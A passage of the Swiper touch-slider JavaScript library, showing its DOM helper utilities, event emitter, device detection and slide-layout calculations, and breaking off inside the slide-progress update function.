! function(e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = "undefined" != typeof globalThis ? globalThis : e || self).Swiper = t()
}(this, (function() {
    "use strict";

    function e(e) {
        return null !== e && "object" == typeof e && "constructor" in e && e.constructor === Object
    }

    function t(s, a) {
        void 0 === s && (s = {}), void 0 === a && (a = {}), Object.keys(a).forEach((n => {
            void 0 === s[n] ? s[n] = a[n] : e(a[n]) && e(s[n]) && Object.keys(a[n]).length > 0 && t(s[n], a[n])
        }))
    }
    const s = {
        body: {},
        addEventListener() {},
        removeEventListener() {},
        activeElement: {
            blur() {},
            nodeName: ""
        },
        querySelector: () => null,
        querySelectorAll: () => [],
        getElementById: () => null,
        createEvent: () => ({
            initEvent() {}
        }),
        createElement: () => ({
            children: [],
            childNodes: [],
            style: {},
            setAttribute() {},
            getElementsByTagName: () => []
        }),
        createElementNS: () => ({}),
        importNode: () => null,
        location: {
            hash: "",
            host: "",
            hostname: "",
            href: "",
            origin: "",
            pathname: "",
            protocol: "",
            search: ""
        }
    };

    function a() {
        const e = "undefined" != typeof document ? document : {};
        return t(e, s), e
    }
    const n = {
        document: s,
        navigator: {
            userAgent: ""
        },
        location: {
            hash: "",
            host: "",
            hostname: "",
            href: "",
            origin: "",
            pathname: "",
            protocol: "",
            search: ""
        },
        history: {
            replaceState() {},
            pushState() {},
            go() {},
            back() {}
        },
        CustomEvent: function() {
            return this
        },
        addEventListener() {},
        removeEventListener() {},
        getComputedStyle: () => ({
            getPropertyValue: () => ""
        }),
        Image() {},
        Date() {},
        screen: {},
        setTimeout() {},
        clearTimeout() {},
        matchMedia: () => ({}),
        requestAnimationFrame: e => "undefined" == typeof setTimeout ? (e(), null) : setTimeout(e, 0),
        cancelAnimationFrame(e) {
            "undefined" != typeof setTimeout && clearTimeout(e)
        }
    };

    function r() {
        const e = "undefined" != typeof window ? window : {};
        return t(e, n), e
    }
    class o extends Array {
        constructor(e) {
            "number" == typeof e ? super(e) : (super(...e || []), function(e) {
                const t = e.__proto__;
                Object.defineProperty(e, "__proto__", {
                    get: () => t,
                    set(e) {
                        t.__proto__ = e
                    }
                })
            }(this))
        }
    }

    function i(e) {
        void 0 === e && (e = []);
        const t = [];
        return e.forEach((e => {
            Array.isArray(e) ? t.push(...i(e)) : t.push(e)
        })), t
    }

    function l(e, t) {
        return Array.prototype.filter.call(e, t)
    }

    function c(e, t) {
        const s = r(),
            n = a();
        let i = [];
        if (!t && e instanceof o) return e;
        if (!e) return new o(i);
        if ("string" == typeof e) {
            const s = e.trim();
            if (s.indexOf("<") >= 0 && s.indexOf(">") >= 0) {
                let e = "div";
                0 === s.indexOf("<li") && (e = "ul"), 0 === s.indexOf("<tr") && (e = "tbody"), 0 !== s.indexOf("<td") && 0 !== s.indexOf("<th") || (e = "tr"), 0 === s.indexOf("<tbody") && (e = "table"), 0 === s.indexOf("<option") && (e = "select");
                const t = n.createElement(e);
                t.innerHTML = s;
                for (let e = 0; e < t.childNodes.length; e += 1) i.push(t.childNodes[e])
            } else i = function(e, t) {
                if ("string" != typeof e) return [e];
                const s = [],
                    a = t.querySelectorAll(e);
                for (let e = 0; e < a.length; e += 1) s.push(a[e]);
                return s
            }(e.trim(), t || n)
        } else if (e.nodeType || e === s || e === n) i.push(e);
        else if (Array.isArray(e)) {
            if (e instanceof o) return e;
            i = e
        }
        return new o(function(e) {
            const t = [];
            for (let s = 0; s < e.length; s += 1) - 1 === t.indexOf(e[s]) && t.push(e[s]);
            return t
        }(i))
    }
    c.fn = o.prototype;
    const d = {
        addClass: function() {
            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
            const a = i(t.map((e => e.split(" "))));
            return this.forEach((e => {
                e.classList.add(...a)
            })), this
        },
        removeClass: function() {
            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
            const a = i(t.map((e => e.split(" "))));
            return this.forEach((e => {
                e.classList.remove(...a)
            })), this
        },
        hasClass: function() {
            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
            const a = i(t.map((e => e.split(" "))));
            return l(this, (e => a.filter((t => e.classList.contains(t))).length > 0)).length > 0
        },
        toggleClass: function() {
            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
            const a = i(t.map((e => e.split(" "))));
            this.forEach((e => {
                a.forEach((t => {
                    e.classList.toggle(t)
                }))
            }))
        },
        attr: function(e, t) {
            if (1 === arguments.length && "string" == typeof e) return this[0] ? this[0].getAttribute(e) : void 0;
            for (let s = 0; s < this.length; s += 1)
                if (2 === arguments.length) this[s].setAttribute(e, t);
                else
                    for (const t in e) this[s][t] = e[t], this[s].setAttribute(t, e[t]);
            return this
        },
        removeAttr: function(e) {
            for (let t = 0; t < this.length; t += 1) this[t].removeAttribute(e);
            return this
        },
        transform: function(e) {
            for (let t = 0; t < this.length; t += 1) this[t].style.transform = e;
            return this
        },
        transition: function(e) {
            for (let t = 0; t < this.length; t += 1) this[t].style.transitionDuration = "string" != typeof e ? `${e}ms` : e;
            return this
        },
        on: function() {
            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
            let [a, n, r, o] = t;

            function i(e) {
                const t = e.target;
                if (!t) return;
                const s = e.target.dom7EventData || [];
                if (s.indexOf(e) < 0 && s.unshift(e), c(t).is(n)) r.apply(t, s);
                else {
                    const e = c(t).parents();
                    for (let t = 0; t < e.length; t += 1) c(e[t]).is(n) && r.apply(e[t], s)
                }
            }

            function l(e) {
                const t = e && e.target && e.target.dom7EventData || [];
                t.indexOf(e) < 0 && t.unshift(e), r.apply(this, t)
            }
            "function" == typeof t[1] && ([a, r, o] = t, n = void 0), o || (o = !1);
            const d = a.split(" ");
            let u;
            for (let e = 0; e < this.length; e += 1) {
                const t = this[e];
                if (n)
                    for (u = 0; u < d.length; u += 1) {
                        const e = d[u];
                        t.dom7LiveListeners || (t.dom7LiveListeners = {}), t.dom7LiveListeners[e] || (t.dom7LiveListeners[e] = []), t.dom7LiveListeners[e].push({
                            listener: r,
                            proxyListener: i
                        }), t.addEventListener(e, i, o)
                    } else
                        for (u = 0; u < d.length; u += 1) {
                            const e = d[u];
                            t.dom7Listeners || (t.dom7Listeners = {}), t.dom7Listeners[e] || (t.dom7Listeners[e] = []), t.dom7Listeners[e].push({
                                listener: r,
                                proxyListener: l
                            }), t.addEventListener(e, l, o)
                        }
            }
            return this
        },
        off: function() {
            for (var e = arguments.length, t = new Array(e), s = 0; s < e; s++) t[s] = arguments[s];
            let [a, n, r, o] = t;
            "function" == typeof t[1] && ([a, r, o] = t, n = void 0), o || (o = !1);
            const i = a.split(" ");
            for (let e = 0; e < i.length; e += 1) {
                const t = i[e];
                for (let e = 0; e < this.length; e += 1) {
                    const s = this[e];
                    let a;
                    if (!n && s.dom7Listeners ? a = s.dom7Listeners[t] : n && s.dom7LiveListeners && (a = s.dom7LiveListeners[t]), a && a.length)
                        for (let e = a.length - 1; e >= 0; e -= 1) {
                            const n = a[e];
                            r && n.listener === r || r && n.listener && n.listener.dom7proxy && n.listener.dom7proxy === r ? (s.removeEventListener(t, n.proxyListener, o), a.splice(e, 1)) : r || (s.removeEventListener(t, n.proxyListener, o), a.splice(e, 1))
                        }
                }
            }
            return this
        },
        trigger: function() {
            const e = r();
            for (var t = arguments.length, s = new Array(t), a = 0; a < t; a++) s[a] = arguments[a];
            const n = s[0].split(" "),
                o = s[1];
            for (let t = 0; t < n.length; t += 1) {
                const a = n[t];
                for (let t = 0; t < this.length; t += 1) {
                    const n = this[t];
                    if (e.CustomEvent) {
                        const t = new e.CustomEvent(a, {
                            detail: o,
                            bubbles: !0,
                            cancelable: !0
                        });
                        n.dom7EventData = s.filter(((e, t) => t > 0)), n.dispatchEvent(t), n.dom7EventData = [], delete n.dom7EventData
                    }
                }
            }
            return this
        },
        transitionEnd: function(e) {
            const t = this;
            return e && t.on("transitionend", (function s(a) {
                a.target === this && (e.call(this, a), t.off("transitionend", s))
            })), this
        },
        outerWidth: function(e) {
            if (this.length > 0) {
                if (e) {
                    const e = this.styles();
                    return this[0].offsetWidth + parseFloat(e.getPropertyValue("margin-right")) + parseFloat(e.getPropertyValue("margin-left"))
                }
                return this[0].offsetWidth
            }
            return null
        },
        outerHeight: function(e) {
            if (this.length > 0) {
                if (e) {
                    const e = this.styles();
                    return this[0].offsetHeight + parseFloat(e.getPropertyValue("margin-top")) + parseFloat(e.getPropertyValue("margin-bottom"))
                }
                return this[0].offsetHeight
            }
            return null
        },
        styles: function() {
            const e = r();
            return this[0] ? e.getComputedStyle(this[0], null) : {}
        },
        offset: function() {
            if (this.length > 0) {
                const e = r(),
                    t = a(),
                    s = this[0],
                    n = s.getBoundingClientRect(),
                    o = t.body,
                    i = s.clientTop || o.clientTop || 0,
                    l = s.clientLeft || o.clientLeft || 0,
                    c = s === e ? e.scrollY : s.scrollTop,
                    d = s === e ? e.scrollX : s.scrollLeft;
                return {
                    top: n.top + c - i,
                    left: n.left + d - l
                }
            }
            return null
        },
        css: function(e, t) {
            const s = r();
            let a;
            if (1 === arguments.length) {
                if ("string" != typeof e) {
                    for (a = 0; a < this.length; a += 1)
                        for (const t in e) this[a].style[t] = e[t];
                    return this
                }
                if (this[0]) return s.getComputedStyle(this[0], null).getPropertyValue(e)
            }
            if (2 === arguments.length && "string" == typeof e) {
                for (a = 0; a < this.length; a += 1) this[a].style[e] = t;
                return this
            }
            return this
        },
        each: function(e) {
            return e ? (this.forEach(((t, s) => {
                e.apply(t, [t, s])
            })), this) : this
        },
        html: function(e) {
            if (void 0 === e) return this[0] ? this[0].innerHTML : null;
            for (let t = 0; t < this.length; t += 1) this[t].innerHTML = e;
            return this
        },
        text: function(e) {
            if (void 0 === e) return this[0] ? this[0].textContent.trim() : null;
            for (let t = 0; t < this.length; t += 1) this[t].textContent = e;
            return this
        },
        is: function(e) {
            const t = r(),
                s = a(),
                n = this[0];
            let i, l;
            if (!n || void 0 === e) return !1;
            if ("string" == typeof e) {
                if (n.matches) return n.matches(e);
                if (n.webkitMatchesSelector) return n.webkitMatchesSelector(e);
                if (n.msMatchesSelector) return n.msMatchesSelector(e);
                for (i = c(e), l = 0; l < i.length; l += 1)
                    if (i[l] === n) return !0;
                return !1
            }
            if (e === s) return n === s;
            if (e === t) return n === t;
            if (e.nodeType || e instanceof o) {
                for (i = e.nodeType ? [e] : e, l = 0; l < i.length; l += 1)
                    if (i[l] === n) return !0;
                return !1
            }
            return !1
        },
        index: function() {
            let e, t = this[0];
            if (t) {
                for (e = 0; null !== (t = t.previousSibling);) 1 === t.nodeType && (e += 1);
                return e
            }
        },
        eq: function(e) {
            if (void 0 === e) return this;
            const t = this.length;
            if (e > t - 1) return c([]);
            if (e < 0) {
                const s = t + e;
                return c(s < 0 ? [] : [this[s]])
            }
            return c([this[e]])
        },
        append: function() {
            let e;
            const t = a();
            for (let s = 0; s < arguments.length; s += 1) {
                e = s < 0 || arguments.length <= s ? void 0 : arguments[s];
                for (let s = 0; s < this.length; s += 1)
                    if ("string" == typeof e) {
                        const a = t.createElement("div");
                        for (a.innerHTML = e; a.firstChild;) this[s].appendChild(a.firstChild)
                    } else if (e instanceof o)
                    for (let t = 0; t < e.length; t += 1) this[s].appendChild(e[t]);
                else this[s].appendChild(e)
            }
            return this
        },
        prepend: function(e) {
            const t = a();
            let s, n;
            for (s = 0; s < this.length; s += 1)
                if ("string" == typeof e) {
                    const a = t.createElement("div");
                    for (a.innerHTML = e, n = a.childNodes.length - 1; n >= 0; n -= 1) this[s].insertBefore(a.childNodes[n], this[s].childNodes[0])
                } else if (e instanceof o)
                for (n = 0; n < e.length; n += 1) this[s].insertBefore(e[n], this[s].childNodes[0]);
            else this[s].insertBefore(e, this[s].childNodes[0]);
            return this
        },
        next: function(e) {
            return this.length > 0 ? e ? this[0].nextElementSibling && c(this[0].nextElementSibling).is(e) ? c([this[0].nextElementSibling]) : c([]) : this[0].nextElementSibling ? c([this[0].nextElementSibling]) : c([]) : c([])
        },
        nextAll: function(e) {
            const t = [];
            let s = this[0];
            if (!s) return c([]);
            for (; s.nextElementSibling;) {
                const a = s.nextElementSibling;
                e ? c(a).is(e) && t.push(a) : t.push(a), s = a
            }
            return c(t)
        },
        prev: function(e) {
            if (this.length > 0) {
                const t = this[0];
                return e ? t.previousElementSibling && c(t.previousElementSibling).is(e) ? c([t.previousElementSibling]) : c([]) : t.previousElementSibling ? c([t.previousElementSibling]) : c([])
            }
            return c([])
        },
        prevAll: function(e) {
            const t = [];
            let s = this[0];
            if (!s) return c([]);
            for (; s.previousElementSibling;) {
                const a = s.previousElementSibling;
                e ? c(a).is(e) && t.push(a) : t.push(a), s = a
            }
            return c(t)
        },
        parent: function(e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) null !== this[s].parentNode && (e ? c(this[s].parentNode).is(e) && t.push(this[s].parentNode) : t.push(this[s].parentNode));
            return c(t)
        },
        parents: function(e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) {
                let a = this[s].parentNode;
                for (; a;) e ? c(a).is(e) && t.push(a) : t.push(a), a = a.parentNode
            }
            return c(t)
        },
        closest: function(e) {
            let t = this;
            return void 0 === e ? c([]) : (t.is(e) || (t = t.parents(e).eq(0)), t)
        },
        find: function(e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) {
                const a = this[s].querySelectorAll(e);
                for (let e = 0; e < a.length; e += 1) t.push(a[e])
            }
            return c(t)
        },
        children: function(e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) {
                const a = this[s].children;
                for (let s = 0; s < a.length; s += 1) e && !c(a[s]).is(e) || t.push(a[s])
            }
            return c(t)
        },
        filter: function(e) {
            return c(l(this, e))
        },
        remove: function() {
            for (let e = 0; e < this.length; e += 1) this[e].parentNode && this[e].parentNode.removeChild(this[e]);
            return this
        }
    };

    function u(e, t) {
        return void 0 === t && (t = 0), setTimeout(e, t)
    }

    function p() {
        return Date.now()
    }

    function m(e, t) {
        void 0 === t && (t = "x");
        const s = r();
        let a, n, o;
        const i = function(e) {
            const t = r();
            let s;
            return t.getComputedStyle && (s = t.getComputedStyle(e, null)), !s && e.currentStyle && (s = e.currentStyle), s || (s = e.style), s
        }(e);
        return s.WebKitCSSMatrix ? (n = i.transform || i.webkitTransform, n.split(",").length > 6 && (n = n.split(", ").map((e => e.replace(",", "."))).join(", ")), o = new s.WebKitCSSMatrix("none" === n ? "" : n)) : (o = i.MozTransform || i.OTransform || i.MsTransform || i.msTransform || i.transform || i.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,"), a = o.toString().split(",")), "x" === t && (n = s.WebKitCSSMatrix ? o.m41 : 16 === a.length ? parseFloat(a[12]) : parseFloat(a[4])), "y" === t && (n = s.WebKitCSSMatrix ? o.m42 : 16 === a.length ? parseFloat(a[13]) : parseFloat(a[5])), n || 0
    }

    function f(e) {
        return "object" == typeof e && null !== e && e.constructor && "Object" === Object.prototype.toString.call(e).slice(8, -1)
    }

    function h(e) {
        return "undefined" != typeof window && void 0 !== window.HTMLElement ? e instanceof HTMLElement : e && (1 === e.nodeType || 11 === e.nodeType)
    }

    function g() {
        const e = Object(arguments.length <= 0 ? void 0 : arguments[0]),
            t = ["__proto__", "constructor", "prototype"];
        for (let s = 1; s < arguments.length; s += 1) {
            const a = s < 0 || arguments.length <= s ? void 0 : arguments[s];
            if (null != a && !h(a)) {
                const s = Object.keys(Object(a)).filter((e => t.indexOf(e) < 0));
                for (let t = 0, n = s.length; t < n; t += 1) {
                    const n = s[t],
                        r = Object.getOwnPropertyDescriptor(a, n);
                    void 0 !== r && r.enumerable && (f(e[n]) && f(a[n]) ? a[n].__swiper__ ? e[n] = a[n] : g(e[n], a[n]) : !f(e[n]) && f(a[n]) ? (e[n] = {}, a[n].__swiper__ ? e[n] = a[n] : g(e[n], a[n])) : e[n] = a[n])
                }
            }
        }
        return e
    }

    function y(e, t, s) {
        e.style.setProperty(t, s)
    }

    function v(e) {
        let {
            swiper: t,
            targetPosition: s,
            side: a
        } = e;
        const n = r(),
            o = -t.translate;
        let i, l = null;
        const c = t.params.speed;
        t.wrapperEl.style.scrollSnapType = "none", n.cancelAnimationFrame(t.cssModeFrameID);
        const d = s > o ? "next" : "prev",
            u = (e, t) => "next" === d && e >= t || "prev" === d && e <= t,
            p = () => {
                i = (new Date).getTime(), null === l && (l = i);
                const e = Math.max(Math.min((i - l) / c, 1), 0),
                    r = .5 - Math.cos(e * Math.PI) / 2;
                let d = o + r * (s - o);
                if (u(d, s) && (d = s), t.wrapperEl.scrollTo({
                        [a]: d
                    }), u(d, s)) return t.wrapperEl.style.overflow = "hidden", t.wrapperEl.style.scrollSnapType = "", setTimeout((() => {
                    t.wrapperEl.style.overflow = "", t.wrapperEl.scrollTo({
                        [a]: d
                    })
                })), void n.cancelAnimationFrame(t.cssModeFrameID);
                t.cssModeFrameID = n.requestAnimationFrame(p)
            };
        p()
    }
    let b, w, C;

    function E() {
        return b || (b = function() {
            const e = r(),
                t = a();
            return {
                smoothScroll: t.documentElement && "scrollBehavior" in t.documentElement.style,
                touch: !!("ontouchstart" in e || e.DocumentTouch && t instanceof e.DocumentTouch),
                passiveListener: function() {
                    let t = !1;
                    try {
                        const s = Object.defineProperty({}, "passive", {
                            get() {
                                t = !0
                            }
                        });
                        e.addEventListener("testPassiveListener", null, s)
                    } catch (e) {}
                    return t
                }(),
                gestures: "ongesturestart" in e
            }
        }()), b
    }

    function _(e) {
        return void 0 === e && (e = {}), w || (w = function(e) {
            let {
                userAgent: t
            } = void 0 === e ? {} : e;
            const s = E(),
                a = r(),
                n = a.navigator.platform,
                o = t || a.navigator.userAgent,
                i = {
                    ios: !1,
                    android: !1
                },
                l = a.screen.width,
                c = a.screen.height,
                d = o.match(/(Android);?[\s\/]+([\d.]+)?/);
            let u = o.match(/(iPad).*OS\s([\d_]+)/);
            const p = o.match(/(iPod)(.*OS\s([\d_]+))?/),
                m = !u && o.match(/(iPhone\sOS|iOS)\s([\d_]+)/),
                f = "Win32" === n;
            let h = "MacIntel" === n;
            return !u && h && s.touch && ["1024x1366", "1366x1024", "834x1194", "1194x834", "834x1112", "1112x834", "768x1024", "1024x768", "820x1180", "1180x820", "810x1080", "1080x810"].indexOf(`${l}x${c}`) >= 0 && (u = o.match(/(Version)\/([\d.]+)/), u || (u = [0, 1, "13_0_0"]), h = !1), d && !f && (i.os = "android", i.android = !0), (u || m || p) && (i.os = "ios", i.ios = !0), i
        }(e)), w
    }

    function L() {
        return C || (C = function() {
            const e = r();
            return {
                isSafari: function() {
                    const t = e.navigator.userAgent.toLowerCase();
                    return t.indexOf("safari") >= 0 && t.indexOf("chrome") < 0 && t.indexOf("android") < 0
                }(),
                isWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(e.navigator.userAgent)
            }
        }()), C
    }
    Object.keys(d).forEach((e => {
        Object.defineProperty(c.fn, e, {
            value: d[e],
            writable: !0
        })
    }));
    var B = {
            on(e, t, s) {
                const a = this;
                if (!a.eventsListeners || a.destroyed) return a;
                if ("function" != typeof t) return a;
                const n = s ? "unshift" : "push";
                return e.split(" ").forEach((e => {
                    a.eventsListeners[e] || (a.eventsListeners[e] = []), a.eventsListeners[e][n](t)
                })), a
            },
            once(e, t, s) {
                const a = this;
                if (!a.eventsListeners || a.destroyed) return a;
                if ("function" != typeof t) return a;

                function n() {
                    a.off(e, n), n.__emitterProxy && delete n.__emitterProxy;
                    for (var s = arguments.length, r = new Array(s), o = 0; o < s; o++) r[o] = arguments[o];
                    t.apply(a, r)
                }
                return n.__emitterProxy = t, a.on(e, n, s)
            },
            onAny(e, t) {
                const s = this;
                if (!s.eventsListeners || s.destroyed) return s;
                if ("function" != typeof e) return s;
                const a = t ? "unshift" : "push";
                return s.eventsAnyListeners.indexOf(e) < 0 && s.eventsAnyListeners[a](e), s
            },
            offAny(e) {
                const t = this;
                if (!t.eventsListeners || t.destroyed) return t;
                if (!t.eventsAnyListeners) return t;
                const s = t.eventsAnyListeners.indexOf(e);
                return s >= 0 && t.eventsAnyListeners.splice(s, 1), t
            },
            off(e, t) {
                const s = this;
                return !s.eventsListeners || s.destroyed ? s : s.eventsListeners ? (e.split(" ").forEach((e => {
                    void 0 === t ? s.eventsListeners[e] = [] : s.eventsListeners[e] && s.eventsListeners[e].forEach(((a, n) => {
                        (a === t || a.__emitterProxy && a.__emitterProxy === t) && s.eventsListeners[e].splice(n, 1)
                    }))
                })), s) : s
            },
            emit() {
                const e = this;
                if (!e.eventsListeners || e.destroyed) return e;
                if (!e.eventsListeners) return e;
                let t, s, a;
                for (var n = arguments.length, r = new Array(n), o = 0; o < n; o++) r[o] = arguments[o];
                return "string" == typeof r[0] || Array.isArray(r[0]) ? (t = r[0], s = r.slice(1, r.length), a = e) : (t = r[0].events, s = r[0].data, a = r[0].context || e), s.unshift(a), (Array.isArray(t) ? t : t.split(" ")).forEach((t => {
                    e.eventsAnyListeners && e.eventsAnyListeners.length && e.eventsAnyListeners.forEach((e => {
                        e.apply(a, [t, ...s])
                    })), e.eventsListeners && e.eventsListeners[t] && e.eventsListeners[t].forEach((e => {
                        e.apply(a, s)
                    }))
                })), e
            }
        },
        N = {
            updateSize: function() {
                const e = this;
                let t, s;
                const a = e.$el;
                t = void 0 !== e.params.width && null !== e.params.width ? e.params.width : a[0].clientWidth, s = void 0 !== e.params.height && null !== e.params.height ? e.params.height : a[0].clientHeight, 0 === t && e.isHorizontal() || 0 === s && e.isVertical() || (t = t - parseInt(a.css("padding-left") || 0, 10) - parseInt(a.css("padding-right") || 0, 10), s = s - parseInt(a.css("padding-top") || 0, 10) - parseInt(a.css("padding-bottom") || 0, 10), Number.isNaN(t) && (t = 0), Number.isNaN(s) && (s = 0), Object.assign(e, {
                    width: t,
                    height: s,
                    size: e.isHorizontal() ? t : s
                }))
            },
            updateSlides: function() {
                const e = this;

                function t(t) {
                    return e.isHorizontal() ? t : {
                        width: "height",
                        "margin-top": "margin-left",
                        "margin-bottom ": "margin-right",
                        "margin-left": "margin-top",
                        "margin-right": "margin-bottom",
                        "padding-left": "padding-top",
                        "padding-right": "padding-bottom",
                        marginRight: "marginBottom"
                    } [t]
                }

                function s(e, s) {
                    return parseFloat(e.getPropertyValue(t(s)) || 0)
                }
                const a = e.params,
                    {
                        $wrapperEl: n,
                        size: r,
                        rtlTranslate: o,
                        wrongRTL: i
                    } = e,
                    l = e.virtual && a.virtual.enabled,
                    c = l ? e.virtual.slides.length : e.slides.length,
                    d = n.children(`.${e.params.slideClass}`),
                    u = l ? e.virtual.slides.length : d.length;
                let p = [];
                const m = [],
                    f = [];
                let h = a.slidesOffsetBefore;
                "function" == typeof h && (h = a.slidesOffsetBefore.call(e));
                let g = a.slidesOffsetAfter;
                "function" == typeof g && (g = a.slidesOffsetAfter.call(e));
                const v = e.snapGrid.length,
                    b = e.slidesGrid.length;
                let w = a.spaceBetween,
                    C = -h,
                    E = 0,
                    _ = 0;
                if (void 0 === r) return;
                "string" == typeof w && w.indexOf("%") >= 0 && (w = parseFloat(w.replace("%", "")) / 100 * r), e.virtualSize = -w, o ? d.css({
                    marginLeft: "",
                    marginBottom: "",
                    marginTop: ""
                }) : d.css({
                    marginRight: "",
                    marginBottom: "",
                    marginTop: ""
                }), a.centeredSlides && a.cssMode && (y(e.wrapperEl, "--swiper-centered-offset-before", ""), y(e.wrapperEl, "--swiper-centered-offset-after", ""));
                const L = a.grid && a.grid.rows > 1 && e.grid;
                let B;
                L && e.grid.initSlides(u);
                const N = "auto" === a.slidesPerView && a.breakpoints && Object.keys(a.breakpoints).filter((e => void 0 !== a.breakpoints[e].slidesPerView)).length > 0;
                for (let n = 0; n < u; n += 1) {
                    B = 0;
                    const o = d.eq(n);
                    if (L && e.grid.updateSlide(n, o, u, t), "none" !== o.css("display")) {
                        if ("auto" === a.slidesPerView) {
                            N && (d[n].style[t("width")] = "");
                            const r = getComputedStyle(o[0]),
                                i = o[0].style.transform,
                                l = o[0].style.webkitTransform;
                            if (i && (o[0].style.transform = "none"), l && (o[0].style.webkitTransform = "none"), a.roundLengths) B = e.isHorizontal() ? o.outerWidth(!0) : o.outerHeight(!0);
                            else {
                                const e = s(r, "width"),
                                    t = s(r, "padding-left"),
                                    a = s(r, "padding-right"),
                                    n = s(r, "margin-left"),
                                    i = s(r, "margin-right"),
                                    l = r.getPropertyValue("box-sizing");
                                if (l && "border-box" === l) B = e + n + i;
                                else {
                                    const {
                                        clientWidth: s,
                                        offsetWidth: r
                                    } = o[0];
                                    B = e + t + a + n + i + (r - s)
                                }
                            }
                            i && (o[0].style.transform = i), l && (o[0].style.webkitTransform = l), a.roundLengths && (B = Math.floor(B))
                        } else B = (r - (a.slidesPerView - 1) * w) / a.slidesPerView, a.roundLengths && (B = Math.floor(B)), d[n] && (d[n].style[t("width")] = `${B}px`);
                        d[n] && (d[n].swiperSlideSize = B), f.push(B), a.centeredSlides ? (C = C + B / 2 + E / 2 + w, 0 === E && 0 !== n && (C = C - r / 2 - w), 0 === n && (C = C - r / 2 - w), Math.abs(C) < .001 && (C = 0), a.roundLengths && (C = Math.floor(C)), _ % a.slidesPerGroup == 0 && p.push(C), m.push(C)) : (a.roundLengths && (C = Math.floor(C)), (_ - Math.min(e.params.slidesPerGroupSkip, _)) % e.params.slidesPerGroup == 0 && p.push(C), m.push(C), C = C + B + w), e.virtualSize += B + w, E = B, _ += 1
                    }
                }
                if (e.virtualSize = Math.max(e.virtualSize, r) + g, o && i && ("slide" === a.effect || "coverflow" === a.effect) && n.css({
                        width: `${e.virtualSize+a.spaceBetween}px`
                    }), a.setWrapperSize && n.css({
                        [t("width")]: `${e.virtualSize+a.spaceBetween}px`
                    }), L && e.grid.updateWrapperSize(B, p, t), !a.centeredSlides) {
                    const t = [];
                    for (let s = 0; s < p.length; s += 1) {
                        let n = p[s];
                        a.roundLengths && (n = Math.floor(n)), p[s] <= e.virtualSize - r && t.push(n)
                    }
                    p = t, Math.floor(e.virtualSize - r) - Math.floor(p[p.length - 1]) > 1 && p.push(e.virtualSize - r)
                }
                if (0 === p.length && (p = [0]), 0 !== a.spaceBetween) {
                    const s = e.isHorizontal() && o ? "marginLeft" : t("marginRight");
                    d.filter(((e, t) => !a.cssMode || t !== d.length - 1)).css({
                        [s]: `${w}px`
                    })
                }
                if (a.centeredSlides && a.centeredSlidesBounds) {
                    let e = 0;
                    f.forEach((t => {
                        e += t + (a.spaceBetween ? a.spaceBetween : 0)
                    })), e -= a.spaceBetween;
                    const t = e - r;
                    p = p.map((e => e < 0 ? -h : e > t ? t + g : e))
                }
                if (a.centerInsufficientSlides) {
                    let e = 0;
                    if (f.forEach((t => {
                            e += t + (a.spaceBetween ? a.spaceBetween : 0)
                        })), e -= a.spaceBetween, e < r) {
                        const t = (r - e) / 2;
                        p.forEach(((e, s) => {
                            p[s] = e - t
                        })), m.forEach(((e, s) => {
                            m[s] = e + t
                        }))
                    }
                }
                if (Object.assign(e, {
                        slides: d,
                        snapGrid: p,
                        slidesGrid: m,
                        slidesSizesGrid: f
                    }), a.centeredSlides && a.cssMode && !a.centeredSlidesBounds) {
                    y(e.wrapperEl, "--swiper-centered-offset-before", -p[0] + "px"), y(e.wrapperEl, "--swiper-centered-offset-after", e.size / 2 - f[f.length - 1] / 2 + "px");
                    const t = -e.snapGrid[0],
                        s = -e.slidesGrid[0];
                    e.snapGrid = e.snapGrid.map((e => e + t)), e.slidesGrid = e.slidesGrid.map((e => e + s))
                }
                if (u !== c && e.emit("slidesLengthChange"), p.length !== v && (e.params.watchOverflow && e.checkOverflow(), e.emit("snapGridLengthChange")), m.length !== b && e.emit("slidesGridLengthChange"), a.watchSlidesProgress && e.updateSlidesOffset(), !(l || a.cssMode || "slide" !== a.effect && "fade" !== a.effect)) {
                    const t = `${a.containerModifierClass}backface-hidden`,
                        s = e.$el.hasClass(t);
                    u <= a.maxBackfaceHiddenSlides ? s || e.$el.addClass(t) : s && e.$el.removeClass(t)
                }
            },
            updateAutoHeight: function(e) {
                const t = this,
                    s = [],
                    a = t.virtual && t.params.virtual.enabled;
                let n, r = 0;
                "number" == typeof e ? t.setTransition(e) : !0 === e && t.setTransition(t.params.speed);
                const o = e => a ? t.slides.filter((t => parseInt(t.getAttribute("data-swiper-slide-index"), 10) === e))[0] : t.slides.eq(e)[0];
                if ("auto" !== t.params.slidesPerView && t.params.slidesPerView > 1)
                    if (t.params.centeredSlides)(t.visibleSlides || c([])).each((e => {
                        s.push(e)
                    }));
                    else
                        for (n = 0; n < Math.ceil(t.params.slidesPerView); n += 1) {
                            const e = t.activeIndex + n;
                            if (e > t.slides.length && !a) break;
                            s.push(o(e))
                        } else s.push(o(t.activeIndex));
                for (n = 0; n < s.length; n += 1)
                    if (void 0 !== s[n]) {
                        const e = s[n].offsetHeight;
                        r = e > r ? e : r
                    }(r || 0 === r) && t.$wrapperEl.css("height", `${r}px`)
            },
            updateSlidesOffset: function() {
                const e = this,
                    t = e.slides;
                for (let s = 0; s < t.length; s += 1) t[s].swiperSlideOffset = e.isHorizontal() ? t[s].offsetLeft : t[s].offsetTop
            },
            updateSlidesProgress: function(e) {
                void 0 === e && (e = this && this.translate || 0);
                const t = this,
                    s = t.params,
                    {
                        slides: a,
                        rtlTranslate: n,
                        snapGrid: r
                    } = t;
                if (0 === a.length) return;
                void 0 === a[0].swiperSlideOffset && t.updateSlidesOffset();
                let o = -e;
                n && (o = e), a.removeClass(s.slideVisibleClass), t.visibleSlidesIndexes = [], t.visibleSlides = [];
                for (let e = 0; e < a.length; e += 1) {
                    const i = a[e];
                    let l = i.swiperSlideOffset;
